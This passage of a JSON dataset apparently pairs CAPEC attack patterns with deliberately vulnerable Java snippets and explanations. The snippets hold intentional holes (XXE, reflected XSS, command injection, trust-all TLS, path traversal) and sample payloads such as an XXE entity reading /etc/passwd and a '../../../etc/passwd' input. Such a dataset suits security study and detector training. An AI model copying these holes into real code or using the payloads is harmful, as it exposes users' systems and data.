        "code_snippet": "public class XMLParser {\n    public static String expandXML(String xml) {\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            factory.setExpandEntityReferences(true);\n            factory.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", true);\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            \n            // Parse potentially malicious XML with nested entity references\n            StringReader reader = new StringReader(xml);\n            Document doc = builder.parse(new InputSource(reader));\n            \n            // Convert back to string without any entity reference limits\n            TransformerFactory transformerFactory = TransformerFactory.newInstance();\n            Transformer transformer = transformerFactory.newTransformer();\n            StringWriter writer = new StringWriter();\n            transformer.transform(new DOMSource(doc), new StreamResult(writer));\n            return writer.toString();\n        } catch (Exception e) {\n            return null;\n        }\n    }",
        "description": "This code is vulnerable to XML entity expansion attacks (billion laughs attack) because it allows unlimited recursive entity expansions without any restrictions. The XML parser is configured to expand entity references and load external DTDs without proper limits, potentially leading to denial of service through excessive CPU and memory consumption when processing maliciously crafted XML input containing nested entity definitions."
    },
    {
        "capec_id": "198",
        "capec_name": "XSS Targeting Error Pages",
        "code_snippet": "public class ErrorHandler extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        try {\n            String userInput = request.getParameter(\"query\");\n            processQuery(userInput);\n        } catch (Exception e) {\n            response.setContentType(\"text/html\");\n            PrintWriter out = response.getWriter();\n            out.println(\"<html><body>\");\n            out.println(\"<h1>Error occurred</h1>\");\n            out.println(\"<div>Error processing query: \" + request.getParameter(\"query\") + \"</div>\");\n            out.println(\"<img src='\" + request.getParameter(\"errorImage\") + \"' />\");\n            out.println(\"<div>Details: \" + e.getMessage() + \"</div>\");\n            out.println(\"</body></html>\");\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable error handler that directly reflects user input in the error page without proper sanitization. It accepts query parameters and displays them in the error page HTML, including within an img tag attribute. The code is vulnerable to XSS attacks through various injection points including the query parameter and errorImage parameter, which could contain malicious JavaScript code that would be executed when the error page is displayed."
    },
    {
        "capec_id": "199",
        "capec_name": "XSS Using Alternate Syntax",
        "code_snippet": "public class WebFilter {\n    private static final List<String> BLOCKED_TAGS = Arrays.asList(\"script\", \"iframe\", \"object\");\n    \n    public String filterContent(String input) {\n        // Vulnerable filtering that only checks exact matches\n        for (String tag : BLOCKED_TAGS) {\n            if (input.contains(\"<\" + tag + \">\")) {\n                return \"Blocked content\";\n            }\n        }\n        // Allows bypass using alternate case like <ScRiPt> or <SCRIPT>\n        return input;\n    }\n    \n    public static void main(String[] args) {\n        WebFilter filter = new WebFilter();\n        String maliciousInput = \"<ScRiPt>alert('xss')</ScRiPt>\";\n        System.out.println(filter.filterContent(maliciousInput));\n    }\n}",
        "description": "This code demonstrates a vulnerable web filter implementation that fails to properly neutralize script-related HTML tags by only checking for exact lowercase matches. The filter can be bypassed using alternate case variations of HTML tags, allowing potential XSS attacks to succeed. The code uses an incomplete denylist approach and doesn't properly normalize input before comparison."
    },
    {
        "capec_id": "200",
        "capec_name": "Removal of filters: Input filters, output filters, data masking",
        "code_snippet": "public class UserInputProcessor {\n    private static final int MAX_INPUT_LENGTH = 1000;\n    \n    public String processUserInput(String input) {\n        // Disabled input validation for performance\n        // if(input.length() > MAX_INPUT_LENGTH) {\n        //     throw new IllegalArgumentException(\"Input too long\");\n        // }\n        \n        // Removed input sanitization\n        // input = input.replaceAll(\"[<>\\\\\\\"'%;()&+]\", \"\");\n        \n        // Direct use of user input in command execution\n        try {\n            Runtime rt = Runtime.getRuntime();\n            Process proc = rt.exec(\"cmd.exe /c \" + input);\n            return \"Command executed successfully\";\n        } catch(Exception e) {\n            return \"Error executing command\";\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable input handling by deliberately disabling input validation and sanitization mechanisms. It accepts user input without length validation or character filtering, and directly uses it in command execution, making it susceptible to command injection attacks. The code shows commented-out security controls that have been disabled, representing the CAPEC scenario of removing filtering mechanisms."
    },
    {
        "capec_id": "201",
        "capec_name": "Serialized Data External Linking",
        "code_snippet": "public class UserProfile implements Serializable {\n    private String username;\n    private transient String password;\n    private String role;\n\n    public static UserProfile loadUserProfile(String filename) {\n        try {\n            XMLInputFactory factory = XMLInputFactory.newInstance();\n            // Vulnerable: XXE enabled by default\n            FileInputStream fis = new FileInputStream(filename);\n            XMLStreamReader reader = factory.createXMLStreamReader(fis);\n            \n            // Deserialize user data from potentially untrusted XML\n            ObjectInputStream ois = new ObjectInputStream(\n                new FileInputStream(reader.getElementText()));\n            return (UserProfile) ois.readObject();\n        } catch (Exception e) {\n            return null;\n        }\n    }\n\n    public void saveUserProfile() {\n        try {\n            FileOutputStream fos = new FileOutputStream(\"user.xml\");\n            ObjectOutputStream oos = new ObjectOutputStream(fos);\n            oos.writeObject(this);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates multiple serialization vulnerabilities: it implements a serializable class containing sensitive data (password), performs unsafe XML deserialization without disabling external entities, and deserializes untrusted data without proper validation. The code allows XML external entity processing which could lead to file disclosure and server-side request forgery attacks."
    },
    {
        "capec_id": "202",
        "capec_name": "Create Malicious Client",
        "code_snippet": "public class MaliciousClient {\n    private static final String AUTH_TOKEN = \"validToken\";\n    \n    public void authenticateWithServer(String serverUrl) {\n        // Bypass server authentication by sending hardcoded token\n        sendRequest(serverUrl, AUTH_TOKEN);\n    }\n    \n    public void sendRequest(String url, String token) {\n        // Custom implementation that modifies server-expected behavior\n        if(isServerValidationEnabled()) {\n            // Skip client-side validations\n            bypassValidation();\n        }\n        \n        // Create unexpected resources on server\n        createHiddenResources();\n        \n        // Execute hidden malicious functionality\n        executeHiddenPayload();\n    }\n    \n    private void bypassValidation() {\n        // Intentionally skip security checks\n        return;\n    }\n    \n    private void createHiddenResources() {\n        // Create unauthorized files/connections\n        new File(\"/tmp/backdoor\").createNewFile();\n    }\n    \n    private void executeHiddenPayload() {\n        // Hidden malicious code\n        Runtime.getRuntime().exec(\"malicious_command\");\n    }\n    \n    private boolean isServerValidationEnabled() {\n        return false; // Always bypass server validation\n    }\n}",
        "description": "This code demonstrates a malicious client that bypasses server-side security by implementing client-side authentication with a hardcoded token, skipping expected validations, creating unauthorized resources, and executing hidden malicious code. The client violates server assumptions about expected behavior and security controls."
    },
    {
        "capec_id": "203",
        "capec_name": "Manipulate Registry Information",
        "code_snippet": "public class RegistryManager {\n    private static final String REGISTRY_PATH = \"SOFTWARE\\\\MyApp\\\\Config\";\n    \n    public static void updateRegistryValue(String key, String value) {\n        try {\n            WinReg.HKEY_LOCAL_MACHINE.createSubKey(REGISTRY_PATH, true);\n            Registry registry = RegistryFactory.getInstance();\n            registry.write(REGISTRY_PATH + \"\\\\\" + key, value);\n            \n            // Store sensitive data without encryption\n            if(key.equals(\"credentials\")) {\n                registry.write(REGISTRY_PATH + \"\\\\plainCredentials\", value);\n            }\n            \n            // No validation of input or caller's permissions\n            if(key.equals(\"securitySettings\")) {\n                registry.write(REGISTRY_PATH + \"\\\\lockBit\", \"0\");\n                registry.write(REGISTRY_PATH + \"\\\\security\", value);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates multiple registry-related security issues: storing sensitive data in cleartext, lack of proper authorization checks, allowing modification of security-critical registry values including lock bits, and no input validation or integrity checking. The code allows direct manipulation of registry values without proper access controls or encryption."
    },
    {
        "capec_id": "204",
        "capec_name": "Lifting Sensitive Data Embedded in Cache",
        "code_snippet": "public class UnsecuredBankingCache {\n    private static Map<String, String> userCache = new HashMap<>();\n\n    public void cacheUserData(String userId, String accountInfo) {\n        // Directly storing sensitive data in cache without encryption\n        userCache.put(userId, accountInfo);\n    }\n\n    public void processBankingTransaction(String userId) {\n        String creditCardNumber = \"4532-7163-9876-1234\";\n        String cvv = \"123\";\n        \n        // Storing sensitive payment data in browser cache\n        HttpServletResponse response = getResponse();\n        response.setHeader(\"Cache-Control\", \"public, max-age=31536000\");\n        response.getWriter().write(\"Credit Card: \" + creditCardNumber + \", CVV: \" + cvv);\n        \n        // Debug information left in register/memory\n        System.out.println(\"DEBUG: Processing payment with card: \" + creditCardNumber);\n    }\n\n    public String retrieveCachedData(String userId) {\n        // Retrieving unencrypted sensitive data from cache\n        return userCache.get(userId);\n    }\n}",
        "description": "This code demonstrates multiple cache-related vulnerabilities including storing sensitive data (credit card information, user data) in an unencrypted cache, improper cache control headers allowing browser caching of sensitive data, and leaving debug information containing sensitive data. The code violates secure practices by not implementing encryption, proper cache controls, or secure data handling."
    },
    {
        "capec_id": "205",
        "capec_name": "DEPRECATED: Lifting credential(s)/key material embedded in client distributions (thick or thin)",
        "code_snippet": "public class AuthenticationManager {\n    private String clientToken = \"secret_token\";\n    \n    public boolean authenticateUser(String username, String password) {\n        // Client-side only authentication\n        if(validateClientToken()) {\n            String credentials = username + \":\" + password;\n            // Store credentials in plain text\n            storeCredentials(credentials);\n            return true;\n        }\n        return false;\n    }\n    \n    private boolean validateClientToken() {\n        // Token validation only happens on client side\n        return clientToken.equals(\"secret_token\");\n    }\n    \n    private void storeCredentials(String credentials) {\n        // Storing sensitive data in plaintext file\n        try {\n            FileWriter writer = new FileWriter(\"credentials.txt\", true);\n            writer.write(credentials + \"\\n\");\n            writer.close();\n        } catch(IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates multiple authentication vulnerabilities including client-side only authentication, storing credentials in plaintext, and inadequate protection of sensitive data. The authentication logic is performed only on the client side and can be bypassed. Credentials are stored in plaintext in a file, making them susceptible to unauthorized retrieval. The code also uses a hardcoded token for authentication which can be easily extracted and replayed."
    },
    {
        "capec_id": "206",
        "capec_name": "Signing Malicious Code",
        "code_snippet": "public class CodeSigner {\n    private static final String SIGNING_KEY = \"MIIEpAIBAAKCAQEAhR4Jj8...\";  // Hard-coded private key\n    private static final String KEY_PASSWORD = \"secretpass123\";\n\n    public static void signAndDistributeCode(String codeBundle) {\n        try {\n            File keyFile = new File(\"/tmp/signing.key\");\n            FileWriter writer = new FileWriter(keyFile);\n            writer.write(SIGNING_KEY);\n            writer.close();\n            \n            // Insecure permissions on key file\n            keyFile.setReadable(true, false);\n            keyFile.setWritable(true, false);\n\n            // No verification of code bundle source\n            URL url = new URL(\"http://untrusted-server.com/\" + codeBundle);\n            InputStream codeStream = url.openStream();\n            \n            // Sign downloaded code without integrity verification\n            SignedObject signedCode = new SignedObject(codeStream, \n                getPrivateKey(keyFile), \n                Signature.getInstance(\"SHA256withRSA\"));\n\n            // Distribute signed code\n            distributeCode(signedCode);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void distributeCode(SignedObject code) {\n        // Code distribution logic\n    }\n}",
        "description": "This vulnerable code demonstrates insecure code signing practices including hard-coded credentials, improper permission management for signing keys, and downloading/signing code without proper integrity verification. The code uses hard-coded signing keys, sets overly permissive file permissions, and downloads code from untrusted sources without validation before signing it."
    },
    {
        "capec_id": "207",
        "capec_name": "Removing Important Client Functionality",
        "code_snippet": "public class OnlineStore {\n    private boolean isPremiumUser = false;\n    \n    public void clientSideCheckout() {\n        // Client-side price calculation and validation\n        double price = calculatePrice();\n        if (isPremiumUser) {\n            price = applyPremiumDiscount(price);\n        }\n        \n        // Client-side payment processing\n        processPayment(price);\n    }\n    \n    public void processPayment(double amount) {\n        // Server blindly trusts the payment amount sent from client\n        completeTransaction(amount);\n    }\n    \n    private double calculatePrice() {\n        return 100.0;\n    }\n    \n    private double applyPremiumDiscount(double price) {\n        return price * 0.8; // 20% discount\n    }\n    \n    private void completeTransaction(double amount) {\n        // Process transaction with amount received from client\n    }\n}",
        "description": "This vulnerable code demonstrates client-side security enforcement where the server blindly trusts price calculations and user privilege checks performed on the client side. An attacker could modify the client code to bypass premium user validation or manipulate the price calculation before sending it to the server."
    },
    {
        "capec_id": "208",
        "capec_name": "Removing/short-circuiting 'Purse' logic: removing/mutating 'cash' decrements",
        "code_snippet": "public class OnlineStore {\n    public double calculateTotalPrice(int itemId, int quantity, String priceHash) {\n        // Get item price from client-side cookie\n        Cookie priceCookie = request.getCookies().stream()\n            .filter(c -> c.getName().equals(\"item_\" + itemId + \"_price\"))\n            .findFirst()\n            .orElse(null);\n            \n        double price = Double.parseDouble(priceCookie.getValue());\n        \n        // Calculate total without validating price or quantity\n        double total = price * quantity;\n        \n        // Accept client-provided hash without verification\n        if (priceHash != null) {\n            return total;\n        }\n        \n        return 0.0;\n    }\n    \n    public void processOrder(int itemId, int quantity, double clientCalculatedTotal) {\n        // Blindly trust client-calculated total\n        debitAccount(clientCalculatedTotal);\n        shipOrder(itemId, quantity);\n    }\n}",
        "description": "This vulnerable code demonstrates client-side enforcement of pricing calculations where the server blindly trusts values from cookies and client-calculated totals without proper validation. The code relies on client-side price information stored in cookies, accepts user-provided quantities without bounds checking, and trusts client-computed totals without server-side verification."
    },
    {
        "capec_id": "209",
        "capec_name": "XSS Using MIME Type Mismatch",
        "code_snippet": "public class FileUploadServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        Part filePart = request.getPart(\"file\");\n        String fileName = filePart.getSubmittedFileName();\n        String contentType = filePart.getContentType();\n        \n        // Vulnerable: trusting file extension and MIME type without proper validation\n        if (fileName.endsWith(\".txt\") || contentType.equals(\"text/plain\")) {\n            String uploadPath = getServletContext().getRealPath(\"/uploads/\") + fileName;\n            filePart.write(uploadPath);\n            \n            // Vulnerable: directly embedding user input without sanitization\n            response.setContentType(\"text/html\");\n            PrintWriter out = response.getWriter();\n            out.println(\"<html><body>\");\n            out.println(\"<img src='uploads/\" + fileName + \"' />\");\n            out.println(\"</body></html>\");\n        }\n    }\n}",
        "description": "This vulnerable code accepts file uploads and trusts the file extension and MIME type without proper validation. It allows an attacker to upload a malicious script file disguised as a text file, which could then be executed when served back to users. The code also directly embeds user input into HTML output without proper sanitization, enabling XSS attacks through the img tag's src attribute."
    },
    {
        "capec_id": "211",
        "capec_name": "DEPRECATED: Leveraging web tools (e.g. Mozilla's GreaseMonkey, Firebug) to change application behavior",
        "code_snippet": "public class VulnerableXSSServlet extends HttpServlet {\n    private static String[] blacklist = {\"<script>\", \"javascript:\"};\n    \n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"userInput\");\n        \n        // Incomplete blacklist-based XSS protection\n        boolean isSafe = true;\n        for (String blocked : blacklist) {\n            if (userInput.toLowerCase().contains(blocked)) {\n                isSafe = false;\n                break;\n            }\n        }\n        \n        if (isSafe) {\n            PrintWriter out = response.getWriter();\n            out.println(\"<html><body>\");\n            // Vulnerable image tag with unfiltered user input\n            out.println(\"<img src='\" + userInput + \"' />\");\n            out.println(\"</body></html>\");\n        }\n    }\n}",
        "description": "This code demonstrates multiple XSS vulnerabilities through incomplete input sanitization. It uses a weak blacklist approach that can be bypassed, and directly embeds user input into an IMG tag's src attribute without proper encoding. The code also lacks proper error handling, potentially exposing sensitive information through default error pages."
    },
    {
        "capec_id": "212",
        "capec_name": "Functionality Misuse",
        "code_snippet": "public class SystemManagement {\n    private static final String ADMIN_PASSWORD = \"s3cret\";\n    \n    public void executeCommand(String command) {\n        // Undocumented backdoor functionality\n        if (command.startsWith(\"DEBUG_\")) {\n            Runtime.getRuntime().exec(command.substring(6));\n            return;\n        }\n        \n        // Low-level memory access functionality\n        if (command.startsWith(\"MEM_\")) {\n            try {\n                sun.misc.Unsafe unsafe = getUnsafeInstance();\n                long address = Long.parseLong(command.substring(4), 16);\n                unsafe.getByte(address);\n            } catch (Exception e) {}\n            return;\n        }\n        \n        // Exposing system information\n        if (command.equals(\"SYSINFO\")) {\n            System.out.println(\"OS: \" + System.getProperty(\"os.version\"));\n            System.out.println(\"Java Home: \" + System.getProperty(\"java.home\"));\n            System.out.println(\"User Home: \" + System.getProperty(\"user.home\"));\n            System.out.println(\"Admin Password: \" + ADMIN_PASSWORD);\n        }\n    }\n    \n    private static sun.misc.Unsafe getUnsafeInstance() throws Exception {\n        java.lang.reflect.Field f = sun.misc.Unsafe.class.getDeclaredField(\"theUnsafe\");\n        f.setAccessible(true);\n        return (sun.misc.Unsafe) f.get(null);\n    }\n}",
        "description": "This code demonstrates misuse of system functionality by including undocumented debug commands, unsafe low-level memory access, and exposure of sensitive system information. It includes a backdoor command prefix, direct memory manipulation using sun.misc.Unsafe, and reveals system properties including an admin password. The code violates security principles by providing unauthorized access to system-level functionality and sensitive information."
    },
    {
        "capec_id": "213",
        "capec_name": "DEPRECATED: Directory Traversal",
        "code_snippet": "public class FileAccessManager {\n    private static final String BASE_DIR = \"/var/www/files/\";\n    \n    public String readFile(String userInputPath) {\n        try {\n            String filePath = BASE_DIR + userInputPath;\n            File file = new File(filePath);\n            FileReader fr = new FileReader(file);\n            BufferedReader br = new BufferedReader(fr);\n            String content = br.readLine();\n            br.close();\n            return content;\n        } catch (IOException e) {\n            return \"Error reading file\";\n        }\n    }\n\n    public static void main(String[] args) {\n        FileAccessManager manager = new FileAccessManager();\n        String userInput = \"../../../etc/passwd\";\n        System.out.println(manager.readFile(userInput));\n    }\n}",
        "description": "This code is vulnerable to path traversal attacks as it directly concatenates user input to a base directory path without sanitization. An attacker can use '../' sequences, multiple dots, or similar path traversal techniques to access files outside the intended base directory. The example shows how an attacker might attempt to read /etc/passwd by traversing up the directory structure."
    },
    {
        "capec_id": "214",
        "capec_name": "DEPRECATED: Fuzzing for garnering J2EE/.NET-based stack traces, for application mapping",
        "code_snippet": "public class VulnerableDebugServer {\n    private ServerSocket serverSocket;\n    private static final Logger logger = Logger.getLogger(\"debug.log\");\n\n    public void start() {\n        try {\n            serverSocket = new ServerSocket(8080);\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                handleRequest(clientSocket);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n            logger.severe(\"Stack trace: \" + e.toString());\n        }\n    }\n\n    private void handleRequest(Socket socket) {\n        try {\n            BufferedReader in = new BufferedReader(\n                new InputStreamReader(socket.getInputStream()));\n            String input = in.readLine();\n            // No input validation\n            processInput(input);\n            logger.info(\"Processing request with parameters: \" + input);\n        } catch (Exception e) {\n            // Expose detailed error information\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            out.println(\"Error details: \" + e.toString());\n            logger.severe(\"Full exception details: \" + e.toString());\n        }\n    }\n\n    private void processInput(String input) {\n        // Dynamic class loading without proper validation\n        try {\n            Class.forName(input).newInstance();\n        } catch (Exception e) {\n            logger.severe(\"Failed to load class: \" + input);\n        }\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities including direct socket usage in J2EE, debug information exposure through logs, missing custom error pages, lack of input validation framework, and unsafe dynamic class loading. The code logs sensitive information, exposes stack traces, and allows arbitrary class loading based on user input."
    },
    {
        "capec_id": "215",
        "capec_name": "Fuzzing for application mapping",
        "code_snippet": "public class SensitiveDataLogger {\n    private static final Logger logger = Logger.getLogger(\"AppLogger\");\n    private static final String DB_URL = \"jdbc:mysql://localhost:3306/production\";\n    private static final String DB_USER = \"admin\";\n    private static final String DB_PASS = \"s3cret123!\";\n\n    public void processUserRequest(String userInput) {\n        try {\n            Connection conn = DriverManager.getConnection(DB_URL, DB_USER, DB_PASS);\n            PreparedStatement stmt = conn.prepareStatement(\"SELECT * FROM users WHERE id = ?\");\n            stmt.setString(1, userInput);\n            ResultSet rs = stmt.executeQuery();\n        } catch (SQLException e) {\n            logger.error(\"Database error: \" + e.getMessage() + \n                        \"\\nConnection details: \" + DB_URL + \n                        \"\\nCredentials: \" + DB_USER + \":\" + DB_PASS);\n            throw new RuntimeException(\"Error processing request: \" + e.toString());\n        }\n    }\n\n    public void validateUser(String username, String password) {\n        try {\n            if(username == null || password == null) {\n                logger.warn(\"Login attempt - Username: \" + username + \", Password: \" + password);\n                throw new IllegalArgumentException(\"Invalid credentials\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n            System.err.println(\"Stack trace: \" + e.getStackTrace().toString());\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable logging practices where sensitive information such as database credentials, connection details, and user credentials are exposed through error messages and logging. The code logs full exception details, database connection information, and authentication attempts, making it susceptible to information disclosure through log analysis and error message inspection. This matches CAPEC's description of an attacker gathering sensitive information through error messages and logs."
    },
    {
        "capec_id": "216",
        "capec_name": "Communication Channel Manipulation",
        "code_snippet": "public class UnsecureMessageSystem {\n    private Socket clientSocket;\n    private PrintWriter out;\n    private BufferedReader in;\n\n    public void startConnection(String ip, int port) {\n        try {\n            clientSocket = new Socket(ip, port);\n            out = new PrintWriter(clientSocket.getOutputStream(), true);\n            in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void sendMessage(String message) {\n        // No authentication check\n        // No message integrity verification\n        // No source verification\n        out.println(message);\n    }\n\n    public String receiveMessage() {\n        try {\n            // Blindly trust incoming data without verification\n            return in.readLine();\n        } catch (IOException e) {\n            return null;\n        }\n    }\n\n    public void transmitSensitiveData(String data) {\n        // Using unencrypted channel for sensitive data\n        // No channel authentication\n        sendMessage(\"CONFIDENTIAL:\" + data);\n    }\n}",
        "description": "This code demonstrates multiple security vulnerabilities in a communication channel. It lacks authentication for critical functions, doesn't verify message integrity during transmission, fails to verify the source of communications, allows channel access by non-endpoints, and potentially enables covert channels. The code uses unencrypted sockets for transmission, doesn't implement any message signing or verification, and blindly trusts incoming data without proper validation."
    },
    {
        "capec_id": "217",
        "capec_name": "Exploiting Incorrectly Configured SSL/TLS",
        "code_snippet": "public class VulnerableSSLClient {\n    public static void main(String[] args) {\n        try {\n            String sensitiveData = \"password=secretpass123&creditcard=4111111111111111\";\n            \n            // Create vulnerable SSL context that accepts all certificates\n            SSLContext sslContext = SSLContext.getInstance(\"SSL\");\n            TrustManager[] trustAllCerts = new TrustManager[] {\n                new X509TrustManager() {\n                    public X509Certificate[] getAcceptedIssuers() { return null; }\n                    public void checkClientTrusted(X509Certificate[] certs, String authType) {}\n                    public void checkServerTrusted(X509Certificate[] certs, String authType) {}\n                }\n            };\n            sslContext.init(null, trustAllCerts, new SecureRandom());\n\n            // Create connection with weak SSL configuration\n            URL url = new URL(\"https://api.example.com/submit\");\n            HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();\n            conn.setSSLSocketFactory(sslContext.getSocketFactory());\n            conn.setHostnameVerifier((hostname, session) -> true);\n            \n            // Send sensitive data without proper channel verification\n            conn.setDoOutput(true);\n            OutputStreamWriter out = new OutputStreamWriter(conn.getOutputStream());\n            out.write(sensitiveData);\n            out.close();\n            \n            conn.getInputStream();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates multiple SSL/TLS vulnerabilities: it disables certificate validation, uses a trust-all certificate manager, bypasses hostname verification, and transmits sensitive data over a potentially compromised channel. The code accepts any SSL certificate as valid and doesn't verify the authenticity of the server, making it susceptible to man-in-the-middle attacks and capture-replay attacks. Additionally, it sends sensitive information (passwords and credit card data) without properly ensuring the security of the communication channel."
    },
    {
        "capec_id": "218",
        "capec_name": "Spoofing of UDDI/ebXML Messages",
        "code_snippet": "public class UDDIServiceConnector {\n    private String serviceUrl;\n    \n    public UDDIServiceConnector(String url) {\n        this.serviceUrl = url;\n    }\n    \n    public BusinessService lookupService(String businessId) {\n        try {\n            URL url = new URL(serviceUrl + \"/lookup/\" + businessId);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            \n            // Vulnerable: No authentication or message integrity verification\n            InputStream response = conn.getInputStream();\n            DocumentBuilder builder = DocumentBuilderFactory.newInstance().newDocumentBuilder();\n            \n            // Vulnerable: No XML validation against schema\n            Document doc = builder.parse(response);\n            \n            // Vulnerable: Trusting data without origin verification\n            String partnerEndpoint = doc.getElementsByTagName(\"serviceEndpoint\").item(0).getTextContent();\n            String securityProtocol = doc.getElementsByTagName(\"securityProtocol\").item(0).getTextContent();\n            \n            // Vulnerable: Direct use of received endpoint without verification\n            return new BusinessService(partnerEndpoint, securityProtocol);\n            \n        } catch (Exception e) {\n            return null;\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable UDDI service lookup implementation that fails to properly validate XML messages, verify message integrity, authenticate communication endpoints, and verify data authenticity. It accepts and processes potentially spoofed UDDI messages without proper security controls, making it susceptible to service provider impersonation attacks."
    },
    {
        "capec_id": "219",
        "capec_name": "XML Routing Detour Attacks",
        "code_snippet": "public class XMLRoutingProcessor {\n    public void processXMLRoute(String xmlContent) {\n        try {\n            // Unsafe processing of WS-Routing headers without validation\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            factory.setExpandEntityReferences(true); // Allows XXE\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document doc = builder.parse(new InputSource(new StringReader(xmlContent)));\n            \n            // Extract routing path without validation\n            NodeList routingPath = doc.getElementsByTagName(\"route\");\n            for (int i = 0; i < routingPath.getLength(); i++) {\n                Element node = (Element) routingPath.item(i);\n                String endpoint = node.getAttribute(\"endpoint\");\n                \n                // Blindly forward to next endpoint without verifying source or destination\n                forwardMessage(endpoint, xmlContent);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private void forwardMessage(String endpoint, String content) {\n        try {\n            URL url = new URL(endpoint);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setDoOutput(true);\n            conn.setRequestMethod(\"POST\");\n            \n            // Forward message without preserving original source information\n            OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream());\n            writer.write(content);\n            writer.flush();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates an XML routing processor that fails to properly validate XML content and routing paths. It accepts XML input without schema validation (CWE-112), allows XML external entity references (CWE-611), and forwards messages without preserving the original source information (CWE-441). The code blindly processes routing instructions and forwards messages to external endpoints without proper validation, making it susceptible to routing detour attacks where an attacker could manipulate the routing path to redirect messages through malicious intermediaries."
    },
    {
        "capec_id": "220",
        "capec_name": "Client-Server Protocol Manipulation",
        "code_snippet": "public class InsecureProtocolClient {\n    private Socket socket;\n    private String serverHost = \"server.example.com\";\n    private int serverPort = 12345;\n\n    public void connectToServer() {\n        try {\n            socket = new Socket(serverHost, serverPort);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n            // Insecure protocol negotiation\n            out.println(\"SUPPORTED_ENCRYPTION=NONE,DES,AES\");\n            String serverResponse = in.readLine();\n            \n            // No server authentication\n            String credentials = \"username:password\";\n            out.println(credentials);\n            \n            // Send sensitive data without proper encryption\n            String sensitiveData = \"SECRET_DATA\";\n            out.println(sensitiveData);\n            \n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates multiple protocol-level vulnerabilities including weak algorithm negotiation allowing downgrade attacks, direct socket usage in J2EE context, lack of proper server authentication, and susceptibility to replay attacks due to unencrypted credential transmission. The code also relies on client-side security controls and doesn't properly verify the destination server identity."
    },
    {
        "capec_id": "221",
        "capec_name": "Data Serialization External Entities Blowup",
        "code_snippet": "public class XMLParser {\n    public void parseXMLFromUser(String xmlInput) {\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            // Vulnerable: XML External Entity (XXE) processing enabled by default\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document doc = builder.parse(new InputSource(new StringReader(xmlInput)));\n            \n            // Process the XML document\n            NodeList nodes = doc.getElementsByTagName(\"*\");\n            for (int i = 0; i < nodes.getLength(); i++) {\n                Node node = nodes.item(i);\n                // Process node content\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void main(String[] args) {\n        String maliciousXML = \"<?xml version=\\\"1.0\\\" encoding=\\\"ISO-8859-1\\\"?>\\n\" +\n                             \"<!DOCTYPE foo [\\n\" +\n                             \"<!ELEMENT foo ANY >\\n\" +\n                             \"<!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\" >]>\\n\" +\n                             \"<foo>&xxe;</foo>\";\n        \n        XMLParser parser = new XMLParser();\n        parser.parseXMLFromUser(maliciousXML);\n    }\n}",
        "description": "This vulnerable code demonstrates an XML parser that doesn't disable external entity processing, allowing XML External Entity (XXE) attacks. The code accepts XML input and processes it without proper restrictions on external entity references. An attacker could exploit this by providing XML containing malicious external entity references that could lead to file disclosure, denial of service through billion laughs attack, or server-side request forgery."
    },
    {
        "capec_id": "222",
        "capec_name": "iFrame Overlay",
        "code_snippet": "public class VulnerableWebPage {\n    @RequestMapping(\"/payment\")\n    public String renderPaymentPage(@RequestParam String returnUrl) {\n        StringBuilder html = new StringBuilder();\n        html.append(\"<html><body>\");\n        // Vulnerable: No validation of returnUrl origin\n        html.append(\"<iframe src='\" + returnUrl + \"' style='opacity:0.0;position:absolute;z-index:2;'>\");\n        html.append(\"</iframe>\");\n        // Legitimate payment form rendered below\n        html.append(\"<div id='paymentForm' style='position:absolute;z-index:1;'>\");\n        html.append(\"<form action='/process-payment' method='POST'>\");\n        html.append(\"<input type='text' name='creditcard' placeholder='Enter Credit Card'>\");\n        html.append(\"<button type='submit'>Pay Now</button>\");\n        html.append(\"</form></div>\");\n        html.append(\"</body></html>\");\n        return html.toString();\n    }\n}",
        "description": "This code demonstrates a vulnerable web payment page that accepts an unvalidated returnUrl parameter to create an iframe. The iframe can be manipulated by an attacker to overlay a malicious UI on top of the legitimate payment form, while keeping the legitimate form's iframe invisible (opacity:0). This enables clickjacking and UI redressing attacks where users think they're interacting with the legitimate payment form but are actually interacting with the malicious overlay."
    },
    {
        "capec_id": "224",
